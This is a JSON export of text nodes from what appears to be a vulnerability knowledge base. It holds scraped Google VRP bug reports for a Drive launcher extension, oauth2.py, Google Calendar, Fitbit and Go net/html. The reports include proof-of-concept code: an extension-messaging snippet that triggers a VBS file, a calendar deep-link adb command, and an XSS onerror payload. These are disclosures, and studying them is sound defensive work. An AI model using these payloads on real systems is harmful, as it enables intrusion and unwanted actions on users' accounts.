"D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_661763.txt", "file_name": "20250408_175649_661763.txt", "file_type": "text/plain", "file_size": 1649, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "dc8f8c68-ea3a-498f-8325-72d9b4aff3fe", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_661763.txt", "file_name": "20250408_175649_661763.txt", "file_type": "text/plain", "file_size": 1649, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3c1dc0955e5382e2d7d284cda9bcead520b74104682a6cabe7c80af4566652f0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nLax messaging rules on Application Launcher For Drive\r\nReported by:\r\nNDevTK\r\nGoogle VRP\r\ntriaged\r\n00:03 | Jul 25, 2023\r\naccepted\r\n17:51 | Jul 28, 2023\r\ntriaged\r\n15:28 | Aug 21, 2023\r\nclosed\r\n22:26 | Aug 23, 2023\r\ntriaged\r\n16:22 | Aug 24, 2023\r\naccepted\r\n19:55 | Aug 24, 2023\r\nfixed\r\n01:53 | Sep 2, 2023\r\nreward decided\r\n$3,133.70\r\nSummary:\r\nLax messaging rules on Application Launcher For Drive\r\nProduct:\r\nGoogle Drive\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/application-launcher-for/lmjegmlicamnimmfhcmpkclmigmmcbeh\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nAny attacker on the same network can send messages to a proxy that opens whatever file they want shared in there google drive as long as there's a shortcut to it.\r\nAnd subdomains are also allowed which maybe a problem if someone finds an XSS :)\r\nThe lax rules that allow insecure origins:\r\n\"externally_connectable\": {\r\n        \"matches\": [\r\n            \"\r\n://\r\n.google.com/*\"\r\n        ]\r\n    },\r\nThe following code runs a VBS script on the victim.\r\nRun the following on any google subdomain including insecure http:// ones.\r\nlet api = chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh', {name: 'com.google.drive.nativeproxy'});\r\nlet request = 'native_opener/v2/3/' + btoa('[\"<VICTIM EMAIL>\", \"<SHARED FILE ID>\",\"VkJTRmlsZQ\",\"\"]');\r\napi.postMessage(request);\r\nAttack scenario\r\nIf the attacker has local network access or a browser extension with any google subdomain and they share a google drive with the victim they can force them to open a VBS file resulting in RCE.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1633, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4ce776c3-3a3d-4611-b73f-6c1a00074b4a": {"__data__": {"id_": "4ce776c3-3a3d-4611-b73f-6c1a00074b4a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.txt", "file_name": "20250408_175649_693170.txt", "file_type": "text/plain", "file_size": 4825, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "87d5ce76-ecfe-49cd-8d1a-6f70116e8ecc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.txt", "file_name": "20250408_175649_693170.txt", "file_type": "text/plain", "file_size": 4825, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fc348390ae7373c136017145b62827a321631b231237fffc11b75ad1de157524", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "19f01f00-2344-40e1-ab2c-573af47d6e48", "node_type": "1", "metadata": {}, "hash": "1a179af26806edeca5c2689d3ba409c9aaeb5e4243bbae436b8ab4df4effa01d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nInsecure defaults in Python libraries are not handled by Oauth2 Python client\r\nReported by:\r\nPentagrid AG\r\nGoogle VRP\r\ntriaged\r\n02:25 | Jul 18, 2023\r\naccepted\r\n22:05 | Jul 20, 2023\r\nfixed\r\n22:54 | Aug 30, 2023\r\nreward decided\r\n$101\r\nSummary:\r\nInsecure defaults in Python libraries are not handled by Oauth2 Python client\r\nProduct:\r\nGoogle OSS (open source software)\r\nURL:\r\nhttps://github.com/google/gmail-oauth2-tools/blob/master/python/oauth2.py\r\nVulnerability type:\r\nunknown\r\nDetails\r\nDear Security team,\r\nI am currently writing a blog post on insecure defaults and regarding this topic, I stumbled upon your open-source script oauth2.py. The code uses a Python library in a way, which does not implement proper certificate checking. I found the vulnerable part here:\r\nhttps://github.com/google/gmail-oauth2-tools/blob/master/python/oauth2.py\r\nThe vulnerable code part is:\r\ndef TestImapAuthentication(user, auth_string):\r\n[...]\r\n  imap_conn = imaplib.IMAP4_SSL('imap.gmail.com')\r\n  imap_conn.debug = 4\r\n  imap_conn.authenticate('XOAUTH2', lambda x: auth_string)\r\n[...]\r\n\r\ndef TestSmtpAuthentication(user, auth_string):\r\n[...]\r\n  smtp_conn = smtplib.SMTP('smtp.gmail.com', 587)\r\n  smtp_conn.set_debuglevel(True)\r\n  smtp_conn.ehlo('test')\r\n  smtp_conn.starttls()\r\n  smtp_conn.docmd('AUTH', 'XOAUTH2 ' + base64.b64encode(auth_string))\r\n[...]\r\nBoth functions are used to check if the authentication was successful. These functions implement the check by connecting the Google IMAP respectively the SMTP server.\r\nThe Python library is used in a vulnerable way. The script is for Python2. Python 3.3 added a SSL context parameter to be able to set a SSL Context. If no proper SSL context is passed to the constructor of imaplib.IMAP4_SSL and smtp_conn.starttls() in Python 3 (or set via other means), there is no certificate checking. With Python2 the underlying problem is the same.\r\nAs a result, the Python library does not check a server's X.509 certificate, which could result in the disclosure of mail server credentials (here authentication tokens), when the client connects to an attacker in a MITM position.\r\nThis problem can be tested by adding an entry to /etc/hosts, for example\r\nanother-imap-server-ip-address      imap.gmail.com\r\nanother-smtp-server-ip-address      smtp.gmail.com\r\nWith another-xxxx-server-ip-address used from the smtp.outlook.com respectivly imap.outlook.com DNS result set.\r\nIf you then run the script, it does not result in a certificate error, but in an invalid authentication error. for example:\r\n$ python2 ./oauth2.py --user=[...]@googlemail.com --access_token=[...] --test_imap_authentication                          \r\n\r\n  25:16.86 > BHID1 AUTHENTICATE XOAUTH2\r\n  25:16.88 < BHID1 NO [ALERT] Authentication failed.\r\n  25:16.88 NO response: [ALERT] Authentication failed.\r\nTraceback (most recent call last):\r\n  File \"./oauth2.py\", line 347, in <module>\r\n    main(sys.argv)\r\n  File \"./oauth2.py\", line 334, in main\r\n    base64_encode=False))\r\n  File \"./oauth2.py\", line 274, in TestImapAuthentication\r\n    imap_conn.authenticate('XOAUTH2', lambda x: auth_string)\r\n  File \"/usr/lib/python2.7/imaplib.py\", line 367, in authenticate\r\n    raise self.error(dat[-1])\r\nimaplib.error: [ALERT] Authentication failed.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3292, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "19f01f00-2344-40e1-ab2c-573af47d6e48": {"__data__": {"id_": "19f01f00-2344-40e1-ab2c-573af47d6e48", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.txt", "file_name": "20250408_175649_693170.txt", "file_type": "text/plain", "file_size": 4825, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "87d5ce76-ecfe-49cd-8d1a-6f70116e8ecc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.txt", "file_name": "20250408_175649_693170.txt", "file_type": "text/plain", "file_size": 4825, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fc348390ae7373c136017145b62827a321631b231237fffc11b75ad1de157524", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "4ce776c3-3a3d-4611-b73f-6c1a00074b4a", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_693170.txt", "file_name": "20250408_175649_693170.txt", "file_type": "text/plain", "file_size": 4825, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7ffeb739af4d2e4b3d79034d521ac2fa6c00bc11926d41f3c2dbd17524078d39", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "25:16.88 NO response: [ALERT] Authentication failed.\r\nTraceback (most recent call last):\r\n  File \"./oauth2.py\", line 347, in <module>\r\n    main(sys.argv)\r\n  File \"./oauth2.py\", line 334, in main\r\n    base64_encode=False))\r\n  File \"./oauth2.py\", line 274, in TestImapAuthentication\r\n    imap_conn.authenticate('XOAUTH2', lambda x: auth_string)\r\n  File \"/usr/lib/python2.7/imaplib.py\", line 367, in authenticate\r\n    raise self.error(dat[-1])\r\nimaplib.error: [ALERT] Authentication failed.\r\nRespectively for the SMTP case:\r\n$ python2 ./oauth2.py --user=[...]@googlemail.com --access_token=[...] --test_smtp_authentication\r\n\r\nsend: 'ehlo test\\r\\n'\r\nreply: '250-BE1P281CA0291.outlook.office365.com Hello [91.5.245.138]\\r\\n'\r\nreply: '250-SIZE 157286400\\r\\n'\r\nreply: '250-PIPELINING\\r\\n'\r\nreply: '250-DSN\\r\\n'\r\nreply: '250-ENHANCEDSTATUSCODES\\r\\n'\r\nreply: '250-STARTTLS\\r\\n'\r\nreply: '250-8BITMIME\\r\\n'\r\nreply: '250-BINARYMIME\\r\\n'\r\nreply: '250-CHUNKING\\r\\n'\r\nreply: '250 SMTPUTF8\\r\\n'\r\nreply: retcode (250); Msg: BE1P281CA0291.outlook.office365.com Hello [91.5.245.138]\r\nSIZE 157286400\r\nPIPELINING\r\nDSN\r\nENHANCEDSTATUSCODES\r\nSTARTTLS\r\n8BITMIME\r\nBINARYMIME\r\nCHUNKING\r\nSMTPUTF8\r\nsend: 'STARTTLS\\r\\n'\r\nreply: '220 2.0.0 SMTP server ready\\r\\n'\r\nreply: retcode (220); Msg: 2.0.0 SMTP server ready\r\nsend: 'AUTH XOAUTH2 dXNlcj[...]=\\r\\n'\r\nreply: '503 5.5.2 Send hello first [BE1P281CA0291.DEUP281.PROD.OUTLOOK.COM 2023-07-16T14:34:55.386Z 08DB85D261AAB272]\\r\\n'\r\nreply: retcode (503); Msg: 5.5.2 Send hello first [BE1P281CA0291.DEUP281.PROD.OUTLOOK.COM 2023-07-16T14:34:55.386Z 08DB85D261AAB272]\r\nThe  oauth2.py is for example used here in the imapsync project:\r\nhttps://github.com/imapsync/imapsync/blob/master/oauth2/oauth2_google.py\r\nWhile certificate verification may have been a nice-to-have feature a decade ago, with Python3.3 but at least in 2023 it is a vulnerability to not have it.\r\nAttack scenario\r\nAn active attacker in MITM position may intercept authentication tokens for IMAP/SMTP.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 2805, "end_char_idx": 4809, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8ec85144-1ce0-460d-9cc5-78e8433192af": {"__data__": {"id_": "8ec85144-1ce0-460d-9cc5-78e8433192af", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.txt", "file_name": "20250408_175649_740770.txt", "file_type": "text/plain", "file_size": 5610, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f11cb73d-ec59-49e3-8391-7adc4aaccd2c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.txt", "file_name": "20250408_175649_740770.txt", "file_type": "text/plain", "file_size": 5610, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6b9c8d1231a0d278bae1a891df1ecb535293ebb697103a58ad49137db8042cae", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "14929813-ff0d-4d70-8bc6-d39b1380b98a", "node_type": "1", "metadata": {}, "hash": "a87577885864e71c19db083d0e74706a0b8e211ea16abcc5c8d63a8519d74514", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nBug allows to respond to calendar events without user interaction.\r\nReported by:\r\nJatin\r\nGoogle VRP\r\ntriaged\r\n03:39 | Jul 11, 2023\r\naccepted\r\n08:45 | Jul 11, 2023\r\nfixed\r\n21:06 | Nov 5, 2023\r\nSummary:\r\nBug allows to respond to calendar events without user interaction.\r\nProduct:\r\nGoogle Calendar\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.calendar\r\nVulnerability type:\r\nOther\r\nDetails\r\nFunctionality\r\nIn Google Calendar, we have the ability to add events and share them with others by including their email addresses during event creation in\r\nAdd guests\r\nfield. Once saved, the event is added to the calendars of the individuals it is shared with.\r\nRecipients can then respond to the invitation by accessing their calendar, opening the event, and selecting one of the three available options: Yes, No, or Maybe.\r\nBug Overview\r\nThere is a bug in the Google Calendar's DeepLink handling functionality, which allows any\r\nthird-party app\r\nor\r\na website\r\nto trigger a vulnerable code that sends response to calendar events on behalf of the user.\r\nVulnerable App:\r\ncom.google.android.calendar\r\nVulnerable Activity:\r\ncom.android.calendar.event.LaunchInfoActivity\r\nExploit DeepLink :\r\nhttps://calendar.google.com/calendar/event?eid=\r\n<eid_here>&action=RESPOND&rst=<1,2 or 3>\r\nStructure of eid\r\nThe event in the calendar is identified by a base64 encoded value. \r\nE.g\r\nYzhzNmFwMzQ3MHBqOGJiMmNsajY4YjlrY2NzbWNiOXBjbGhqMmI5bmNrbzMycDlnY2hpbTRkcG1jayBnaG9zdGluZnJpZGF5QG0\r\nOn decoding the value;\r\nc8s6ap3470pj8bb2clj68b9kccsmcb9pclhj2b9ncko32p9gchim4dpmck ghostinfriday@m\r\nThe decoded value consists of 2 parts separated by space.\r\nPart1:\r\nevent_id\r\nPart2:\r\nemail of the user to which this event belongs\r\nGenerating eid\r\nAttacker needs to generate eid of the events that get added into target user's calendar, to build the malicious deepLink that exploits the bug.\r\nFor that purpose, let's assume following data;\r\nAttacker:\r\nattacker@gmail.com\r\ntarget1:\r\ntarget1@gmail.com\r\ntarget2:\r\ntarget2@gmail.com\r\nSteps to get attacker event eid\r\nOpen calendar.google.com, login with\r\nattacker@gmail.com\r\nCreate an event; add target1 and target2 as guests and save it.\r\nOpen Developers Tool for the same window using ctrl+shift+i;\r\nbrowse to network tab\r\nchoose only XHR request filter; to ignore rest of the noise\r\nclear previous requests\r\nRefresh the window\r\nSearch for request to\r\n/calendar/u/0/sync.prefetcheventrange\r\nendpoint\r\nLook into the protobuf response; try to look for the\r\ntitle of the event\r\n; above title you will find a url with syntax\r\nhttps://www.google.com/calendar/event?eid=<event_id>\r\nThe\r\neid\r\nthat we get in\r\nstep6\r\nbelongs to the calendar of\r\nattacker\r\n,\r\nSteps to generate target event eid\r\nBase64Decode the eid from step6 ; you will observe the following pattern (ignore the quotes)\r\n\"<unique_id>\"+\"a space\"+\"attacker@m\"\r\nReplace\r\nattacker@m\r\nwith\r\ntarget1@m\r\n\"<unique_id>\"+\"space\"+\"target1@m\"\r\nBase64Encode the above string; to get the\r\neid\r\nfor\r\ntarget1\r\nFinally we have the\r\neid\r\nof the events; that's added into the target users calendar.\r\nThis is pre-requisite for bug reproduction.\r\nP.S: steps 1-6 are for chromium based browsers; not sure about safari or firefox.\r\nSteps to Reproduce Bug\r\nPre-requisites\r\nTwo google accounts; consider one as\r\nattacker\r\nand other as\r\ntarget\r\nAn android device with calendar installed and logged in with\r\ntarget account\r\nCreate a new event invite in\r\nattacker account\r\nusing calendar web interface at calendar.google.com, add\r\ntarget account\r\nin\r\nAdd Invite\r\n. Confirm that new event is created in\r\ntarget calendar\r\n, by opening\r\nGoogle Calendar\r\nin android device.\r\nGenerate\r\nTarget's eid\r\n(Refer Generating eid section)\r\nUbuntu machine with adb installed.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3782, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "14929813-ff0d-4d70-8bc6-d39b1380b98a": {"__data__": {"id_": "14929813-ff0d-4d70-8bc6-d39b1380b98a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.txt", "file_name": "20250408_175649_740770.txt", "file_type": "text/plain", "file_size": 5610, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f11cb73d-ec59-49e3-8391-7adc4aaccd2c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.txt", "file_name": "20250408_175649_740770.txt", "file_type": "text/plain", "file_size": 5610, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6b9c8d1231a0d278bae1a891df1ecb535293ebb697103a58ad49137db8042cae", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "8ec85144-1ce0-460d-9cc5-78e8433192af", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.txt", "file_name": "20250408_175649_740770.txt", "file_type": "text/plain", "file_size": 5610, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "207eff11a9f7f6098cdca642526490fb0ca997978009f93305ebc3155a094701", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "This is pre-requisite for bug reproduction.\r\nP.S: steps 1-6 are for chromium based browsers; not sure about safari or firefox.\r\nSteps to Reproduce Bug\r\nPre-requisites\r\nTwo google accounts; consider one as\r\nattacker\r\nand other as\r\ntarget\r\nAn android device with calendar installed and logged in with\r\ntarget account\r\nCreate a new event invite in\r\nattacker account\r\nusing calendar web interface at calendar.google.com, add\r\ntarget account\r\nin\r\nAdd Invite\r\n. Confirm that new event is created in\r\ntarget calendar\r\n, by opening\r\nGoogle Calendar\r\nin android device.\r\nGenerate\r\nTarget's eid\r\n(Refer Generating eid section)\r\nUbuntu machine with adb installed.\r\nTriggering Bug\r\nThere are 2 ways to trigger the bug in target device\r\nBy sending an intent to vulnerable activity\r\nBy sending a malicious link to the target person\r\nUsing Intent\r\nConnect the target android device with ubuntu machine, make sure usb-debugging is enabled.\r\nExecute the following command, replace <target_eid>, with the generated one.\r\nadb shell am start-activity -d 'https://calendar.google.com/calendar/event?eid=<target_eid>&action=RESPOND&rst=2' com.google.android.calendar/com.android.calendar.event.LaunchInfoActivity\r\nYou will notice a toast getting popped up, regarding responding to the event. Open the calendar, check the event and you will notice a response was sent.\r\nYou can change the\r\nrst\r\nwith\r\n1, 2 or 3\r\n, to test the behavior.\r\nUsing Malicious Link\r\nIn this approach, the attacker sends a link to the target user. \r\nThe target user on opening the link see a normal page, but under the hood it redirects to a malicious deepLink, that calendar handles that inturn executes vulnerable code and responds to the calendar event\r\nGrab the\r\npoc.html\r\nfile that is attached with the report\r\nAdd the required fields,\r\neid\r\nand\r\nrst\r\n. Save it\r\nMake sure ubuntu machine and android device are on the same network.\r\nServe this\r\npoc.html\r\nfrom ubuntu machine, such that it can be opened in the android device.\r\nOne way is to use\r\nphp\r\n. Execute below commands in a terminal\r\ncd <poc.html_directory>\r\nphp -S <host>:<port>\r\nA server will get started at host:port\r\nOpen the link\r\nhttp://host:port/poc.html\r\nin\r\nGoogle App\r\nOn visiting it will trigger the bug and the calendar response will get changed.\r\nAttack scenario\r\nThe risk here is that a malicious actor can cause google calendar to respond to calendar events without the knowledge of user. The bug is similar to CSRF\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3130, "end_char_idx": 5594, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8e3fb50b-6f39-4382-941e-483470e0d4fd": {"__data__": {"id_": "8e3fb50b-6f39-4382-941e-483470e0d4fd", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_772253.txt", "file_name": "20250408_175649_772253.txt", "file_type": "text/plain", "file_size": 1208, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "fdb1493f-c273-40b9-ba6e-a9adf26a6d24", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_772253.txt", "file_name": "20250408_175649_772253.txt", "file_type": "text/plain", "file_size": 1208, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cfc38d8880a9c5be1687775fb00a5a7735d66aa0d09dd2871186fea73edcff0e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nIDOR leads to Information disclosure\r\nReported by:\r\nSaptak Saha\r\nGoogle VRP\r\ntriaged\r\n19:30 | Jul 5, 2023\r\naccepted\r\n21:48 | Jul 5, 2023\r\nfixed\r\n14:57 | Oct 16, 2023\r\nreward decided\r\n$500\r\nSummary:\r\nIDOR leads to Information disclosure\r\nProduct:\r\nFitbit (Services)\r\nURL:\r\nhttps://www.fitbit.com/foods/Private+Food+1/809420363/edit\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nHere we have used two users for POC.\r\nFirst, we have to create a private food and we have added a private brand to make sure this is not visible to others and is private to user A only.\r\nThen I tried to edit the private food and noticed that the URL contains a numerical value.\r\nSo, I tried to log in as User B, then tried to create a new private food. \r\nAfter the creation of the food, tried to edit the item. While trying to edit the item, i have changed the numerical value and used the numerical value of the first user.\r\nAttack scenario\r\nHere, an attacker can simply bruteforce the numerical part of the URL and then try to enumerate the private food items added by users and also they can see the private brand names of other users.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1192, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "616c1a41-265c-4f55-917f-77ac86a8f2d5": {"__data__": {"id_": "616c1a41-265c-4f55-917f-77ac86a8f2d5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_898817.txt", "file_name": "20250408_175651_898817.txt", "file_type": "text/plain", "file_size": 2789, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a8345bde-297f-4740-81c4-df05ce25fe03", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_898817.txt", "file_name": "20250408_175651_898817.txt", "file_type": "text/plain", "file_size": 2789, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "cef42f6396e1f2bb524fbda4e3034e09716d596af0899845326d994faaad9524", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGolang net/html parse the &lt; into < inside style tag that could lead to XSS\r\nGoogle VRP\r\ntriaged\r\n14:51 | Jun 28, 2023\r\naccepted\r\n16:47 | Jun 28, 2023\r\ntriaged\r\n15:51 | Jul 7, 2023\r\naccepted\r\n16:26 | Jul 7, 2023\r\nfixed\r\n12:26 | Aug 31, 2023\r\nreward decided\r\n$7,500\r\nSummary:\r\nGolang net/html parse the < into < inside style tag that could lead to XSS\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGolang\r\nURL:\r\ngithub.com/golang/net\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi there.\r\ni've been checking the golang net/html lately and i found this.\r\nnet/html parser will parse the < and > symbol into &lt(; )and &gt(;) in some context. and leave it as it is in some context.\r\nbut the same as the browser. net/html did parse the &lt(;) into < inside of the style tag.\r\nif somehow the website give the user to insert / input only the h1, h2, h3 but the rest getting deleted it could also lead to some vulnerabilities.\r\nfor example. this payload right here\r\n<svg><style>/* &lt;/style> &lt;img src=x onerror=alert(document.domain)>\r\nif that payload get parse with this code\r\npackage main\r\n\r\nimport (\r\n    \"bytes\"\r\n    \"errors\"\r\n    \"fmt\"\r\n    \"golang.org/x/net/html\"\r\n    \"io\"\r\n    \"log\"\r\n    \"strings\"\r\n)\r\n\r\nfunc Body(doc *html.Node) (*html.Node, error) {\r\n    var body *html.Node\r\n    var crawler func(*html.Node)\r\n    crawler = func(node *html.Node) {\r\n        if node.Type == html.ElementNode && node.Data == \"body\" {\r\n            body = node\r\n            return\r\n        }\r\n        for child := node.FirstChild; child != nil; child = child.NextSibling {\r\n            crawler(child)\r\n        }\r\n    }\r\n    crawler(doc)\r\n    if body != nil {\r\n        return body, nil\r\n    }\r\n    return nil, errors.New(\"Missing <body> in the node tree\")\r\n}\r\n\r\nfunc renderNode(n *html.Node) string {\r\n    var buf bytes.Buffer\r\n    w := io.Writer(&buf)\r\n    html.Render(w, n)\r\n    return buf.String()\r\n}\r\n\r\nconst parsethis = \"<body><svg><style>/* &lt;/style> &lt;img src=x onerror=alert(document.domain)>\"\r\n\r\nfunc main() {\r\n    doc, _ := html.Parse(strings.NewReader(parsethis))\r\n    bn, er := Body(doc)\r\n    if er != nil {\r\n        log.Fatal(er)\r\n    }\r\n    body := renderNode(bn)\r\n    fmt.Println(\"\\n------P2\\n\", parsethis, \"\\n\", body, \"\\n-------\\n\")\r\n\r\n}\r\nit will return this (< turn into <)\r\n<body><svg><style>/* </style> <img src=x onerror=alert(document.domain)></style></svg></body>\r\nbut because the the input only allowed the h1 tag. the svg tag will get removed and the rest will be served. because the rest is the text / content inside the <style>.\r\nand the <style> also been closed and onerror inside of the <img> will be triggered.\r\nAttack scenario\r\nattacker could inject malicious javascript code.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2773, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "edc858c7-4844-4e03-9da9-85f54c704919": {"__data__": {"id_": "edc858c7-4844-4e03-9da9-85f54c704919", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_934235.txt", "file_name": "20250408_175651_934235.txt", "file_type": "text/plain", "file_size": 3002, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "3b68f9e9-7843-456f-8a25-0233e692a9cc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_934235.txt", "file_name": "20250408_175651_934235.txt", "file_type": "text/plain", "file_size": 3002, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "9c7bb0c7a63021a0a7ec7dfd38c1b7b199bb26b1df6aa431f39536a1e28f4a32", "class_name": "RelatedNodeInfo"}}, "metadata_template": 